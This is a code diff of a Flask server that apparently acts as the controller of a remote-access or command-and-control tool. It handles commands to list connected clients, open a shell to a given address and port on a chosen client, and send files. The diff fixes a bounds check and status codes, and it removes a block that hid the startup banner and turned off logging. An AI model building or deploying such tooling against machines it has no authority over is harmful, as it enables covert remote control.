@@ -80,8 +80,6 @@ def getFile():
     else:
         return "Error",404
 
-
-
 @app.route('/admin', methods=["POST"])
 def adminCmd():
     try:
@@ -93,6 +91,8 @@ def adminCmd():
 ########################    HELPERS    #########################
 
 def parseJsonPOST_RPC(json,master):
+
+    status_return=200
     if (json["CMD"]=="displayClients"):
         print("RPC DISPLAY",json)
         result=master.displayClients()
@@ -100,11 +100,10 @@ def parseJsonPOST_RPC(json,master):
     elif (json["CMD"]=="abrirShell"):
         print("RPC abrirShell",json)
         result=master.abrirShell(json["uid"],json["addr"],json["port"])
-        #print ("OLHA> " + len(master.getClients()))
-        if (len(master.getClients())>json["uid"]) and (json["uid"] < 0):
-            result = "ok"
-        else :
-            result = "false"
+        if (json["uid"] < len(master.clientList) and json["uid"] >= 0):
+            status_return = 200
+        else:
+            status_return = 400
 
     elif (json["CMD"]=="sendFile"):
         print("RPC sendFile",json)
@@ -128,19 +127,9 @@ def parseJsonPOST_RPC(json,master):
     else:
         return {"status":"unkown"},401
     
-    return {"status":result},200
+    return {"status":result},status_return
 
-verbose=False
-if not verbose:
-        #disables startup message lol
-        import sys
-        cli = sys.modules['flask.cli']
-        cli.show_server_banner = lambda *x: None
 
-        app.logger.disabled=True
-        log = logging.getLogger('werkzeug')
-        log.disabled = True
-
-app.run("0.0.0.0",port=8080,debug=verbose, use_reloader=False)
+app.run("0.0.0.0",port=8080, use_reloader=False)
 
 
